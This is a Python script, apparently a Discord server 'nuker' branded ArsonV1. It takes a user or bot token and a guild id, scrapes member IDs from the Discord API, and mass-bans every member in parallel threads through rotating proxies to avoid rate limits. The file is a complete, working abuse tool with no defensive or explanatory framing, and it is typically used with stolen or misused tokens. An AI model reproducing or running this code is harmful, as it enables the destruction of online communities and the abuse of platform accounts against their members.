
try:
    import asyncio, aiohttp, os, sys, threading
    import datetime, time, requests, random
    from itertools                                                           import cycle
    from requests_futures.sessions                                           import FuturesSession
    from pystyle                                                             import Add, Center, Anime, Colors, Colorate, Write, System
except ImportError as e:
    os.system('pip install -r requirements.txt')
    
p = open("proxies.txt").read().split("\n")
sd = len(p)
try:
    os.system(f'clear & mode 75, 20 & title ArsonV1')
except:
    os.system(f'cls & mode 75, 20 & title ArsonV1')

token = Write.Input("Token: ", Colors.yellow_to_red)
guild_id = Write.Input("Guild id: ", Colors.yellow_to_red)

logo = r'''                
  _____  _______  ______ ____    ____   
  \__  \ \_  __ \/  ___//  _ \  /    \  
   / __ \_|  | \/\___ \(  <_> )|   |  \ 
  (____  /|__|  /____  >\____/ |___|  / 
       \/            \/             \/  
                                     
                                      
              PRESS ENTER
    '''
Anime.Fade(Center.Center(logo), Colors.red_to_yellow, Colorate.Vertical, interval=0.030, enter=True)

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
    
        return "bot"


token_type = check_token()
if token_type == "user":
    headers = {'Authorization': f'{token}'}
   
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}

def get_members():
    proxyies = open("proxies.txt")
    proxy = [line.strip() for line in proxyies]
    session = requests.Session()
    memberIDS = []
    try:
        r = session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
       
        m = r.json()
        for member in m:
            memberIDS.append(member["user"]["id"])
            
    except TypeError:
        print("you are being banned from discord")
         
    return memberIDS
    
    
def ban_tasks(session, id):
    proxy = open("proxies.txt")
    proxies = cycle(proxy)
    
    try:    
        r = session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{id}", headers=headers, proxies={'http': f'http://' + next(proxies)})
        
           
    except:
        pass
    
async def main():
    try:
        os.system(f'clear & mode 75, 20 & title ArsonV1')
    except:
        os.system(f'cls & mode 75, 20 & title ArsonV1')
        
    

    print(Colorate.Vertical(Colors.red_to_yellow, f'''

                                          
             _____  _______  ______ ____    ____   
             \__  \ \_  __ \/  ___//  _ \  /    \  
              / __ \_|  | \/\___ \(  <_> )|   |  \ 
             (____  /|__|  /____  >\____/ |___|  / 
                  \/            \/             \/  
                                      
                                       proxies: {sd}
          [1] Ban All
          [x] Exit
    '''))
    
    
    choose = Write.Input("   >  ", Colors.yellow_to_red)
    if choose == "1":
        print("scraping members....")
        threads = []
        session = FuturesSession(max_workers=350)
        memberIDS = get_members()
        print(f"Banning.....{len(memberIDS)}")
        for m in memberIDS:
            t = threading.Thread(target=ban_tasks, args=(session, m,))
            t.start()
            threads.append(t)
            
        for thread in threads:
            try:
                thread.join()
            except:
                pass
                
                
        await asyncio.sleep(2)       
        await main()
        
    elif choose == "x" or choose == "X":
        os._exit(0)
        
    else:
        print("No option found")
        time.sleep(2)
        await main()
        

if __name__ == "__main__":
    
    asyncio.run(main())
